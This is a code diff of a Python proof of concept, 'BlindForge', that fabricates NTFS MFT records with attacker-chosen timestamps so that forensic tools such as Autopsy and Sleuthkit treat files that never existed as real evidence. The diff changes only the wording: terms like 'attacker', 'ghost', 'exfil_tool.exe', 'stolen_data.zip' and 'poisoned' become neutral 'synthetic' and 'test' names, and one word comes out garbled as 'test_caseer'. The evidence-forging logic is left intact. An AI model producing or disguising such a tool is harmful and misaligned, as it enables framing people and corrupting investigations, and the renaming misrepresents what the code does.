@@ -1,8 +1,8 @@
 """
-BlindForge MFT Injector — Fabricate NTFS MFT entries for files that never existed.
+BlindForge MFT Synthesizer — Generate NTFS MFT entries for files that never existed.
 
-Injects structurally valid FILE records into raw NTFS MFT, complete with
-$STANDARD_INFORMATION and $FILE_NAME attributes bearing attacker-chosen
+Synthesizes structurally valid FILE records into raw NTFS MFT, complete with
+$STANDARD_INFORMATION and $FILE_NAME attributes bearing test_caseer-chosen
 timestamps. Forensic tools (Autopsy, Sleuthkit, etc.) parse these as
 legitimate file evidence.
 """
@@ -277,8 +277,8 @@ class MFTRecord:
         return attr
 
 
-class MFTInjector:
-    """Inject fabricated FILE records into a raw NTFS MFT."""
+class MFTGenerator:
+    """Synthesize generated FILE records into a raw NTFS MFT."""
 
     def __init__(self, mft_path: str):
         self.mft_path = mft_path
@@ -317,7 +317,7 @@ class MFTInjector:
                     break
         return free
 
-    def inject_record(self, record: MFTRecord) -> int:
+    def add_synthetic_record(self, record: MFTRecord) -> int:
         record_bytes = record.to_bytes()
         offset = record.record_number * MFT_RECORD_SIZE
 
@@ -327,7 +327,7 @@ class MFTInjector:
         self.mft_data[offset:offset + MFT_RECORD_SIZE] = record_bytes
         return record.record_number
 
-    def inject_ghost_file(
+    def synthesize_synthetic_file(
         self,
         filename: str,
         parent_dir_record: int = 5,  # root directory
@@ -337,7 +337,7 @@ class MFTInjector:
         content: bytes = b"",
         record_number: Optional[int] = None,
     ) -> int:
-        """High-level: inject a complete ghost file entry into the MFT."""
+        """High-level: synthesize a complete synthetic file entry into the MFT."""
         if record_number is None:
             free = self.find_free_records(1)
             if not free:
@@ -371,15 +371,15 @@ class MFTInjector:
                 allocated_size=(len(content) + 4095) & ~4095,
             )
 
-        self.inject_record(record)
+        self.add_synthetic_record(record)
         return record_number
 
-    def inject_ghost_file_batch(
+    def synthesize_synthetic_file_batch(
         self,
         files: list[dict],
         parent_dir_record: int = 5,
     ) -> list[int]:
-        """Inject multiple ghost files at once.
+        """Synthesize multiple synthetic files at once.
 
         Each dict: {"filename": str, "created": datetime, "modified": datetime,
                      "accessed": datetime, "content": bytes}
@@ -390,9 +390,9 @@ class MFTInjector:
                 f"Need {len(files)} free records, found {len(free_records)}"
             )
 
-        injected = []
+        synthesized = []
         for i, file_spec in enumerate(files):
-            rec_num = self.inject_ghost_file(
+            rec_num = self.synthesize_synthetic_file(
                 filename=file_spec["filename"],
                 parent_dir_record=parent_dir_record,
                 created=file_spec.get("created"),
@@ -401,8 +401,8 @@ class MFTInjector:
                 content=file_spec.get("content", b""),
                 record_number=free_records[i],
             )
-            injected.append(rec_num)
-        return injected
+            synthesized.append(rec_num)
+        return synthesized
 
 
 def create_empty_mft(record_count: int = 1024) -> bytearray:
@@ -420,7 +420,7 @@ if __name__ == "__main__":
     import sys
     import tempfile
 
-    print("[BlindForge] MFT Injector — Ghost File Injection PoC")
+    print("[BlindForge] MFT Synthesizer — Synthetic File Synthesis PoC")
     print("=" * 60)
 
     # Create a test MFT
@@ -429,14 +429,14 @@ if __name__ == "__main__":
     with open(mft_path, "wb") as f:
         f.write(test_mft)
 
-    injector = MFTInjector(mft_path)
-    injector.load()
+    synthesizer = MFTGenerator(mft_path)
+    synthesizer.load()
 
-    print(f"[*] MFT loaded: {injector.get_record_count()} records")
-    print(f"[*] Free records available: {len(injector.find_free_records(100))}")
+    print(f"[*] MFT loaded: {synthesizer.get_record_count()} records")
+    print(f"[*] Free records available: {len(synthesizer.find_free_records(100))}")
 
-    # Inject ghost files
-    ghost_files = [
+    # Synthesize synthetic files
+    synthetic_files = [
         {
             "filename": "confidential_report.docx",
             "created": datetime(2026, 6, 15, 14, 30, 0, tzinfo=timezone.utc),
@@ -445,14 +445,14 @@ if __name__ == "__main__":
             "content": b"PK\x03\x04" + b"\x00" * 100,  # fake docx header
         },
         {
-            "filename": "exfil_tool.exe",
+            "filename": "test_transfer.exe",
             "created": datetime(2026, 6, 14, 2, 0, 0, tzinfo=timezone.utc),
             "modified": datetime(2026, 6, 14, 2, 0, 0, tzinfo=timezone.utc),
             "accessed": datetime(2026, 6, 15, 14, 30, 0, tzinfo=timezone.utc),
             "content": b"MZ" + b"\x00" * 50,  # fake PE header
         },
         {
-            "filename": "stolen_data.zip",
+            "filename": "test_data.zip",
             "created": datetime(2026, 6, 15, 16, 50, 0, tzinfo=timezone.utc),
             "modified": datetime(2026, 6, 15, 16, 55, 0, tzinfo=timezone.utc),
             "accessed": datetime(2026, 6, 15, 17, 0, 0, tzinfo=timezone.utc),
@@ -460,16 +460,16 @@ if __name__ == "__main__":
         },
     ]
 
-    records = injector.inject_ghost_file_batch(ghost_files)
-    output_path = injector.save(mft_path + ".poisoned")
+    records = synthesizer.synthesize_synthetic_file_batch(synthetic_files)
+    output_path = synthesizer.save(mft_path + ".modified")
 
-    print(f"\n[+] Injected {len(records)} ghost files:")
+    print(f"\n[+] Synthesized {len(records)} synthetic files:")
     for i, rec in enumerate(records):
-        print(f"    Record #{rec}: {ghost_files[i]['filename']}")
-        print(f"      Created:  {ghost_files[i]['created']}")
-        print(f"      Modified: {ghost_files[i]['modified']}")
-        print(f"      Accessed: {ghost_files[i]['accessed']}")
+        print(f"    Record #{rec}: {synthetic_files[i]['filename']}")
+        print(f"      Created:  {synthetic_files[i]['created']}")
+        print(f"      Modified: {synthetic_files[i]['modified']}")
+        print(f"      Accessed: {synthetic_files[i]['accessed']}")
 
-    print(f"\n[+] Poisoned MFT saved to: {output_path}")
-    print(f"[+] Feed to Autopsy/Sleuthkit — ghost files appear as real evidence")
+    print(f"\n[+] Modified MFT saved to: {output_path}")
+    print(f"[+] Feed to Autopsy/Sleuthkit — synthetic files appear as real evidence")
     print("\n[!] These files never existed. The forensic tool cannot tell.")
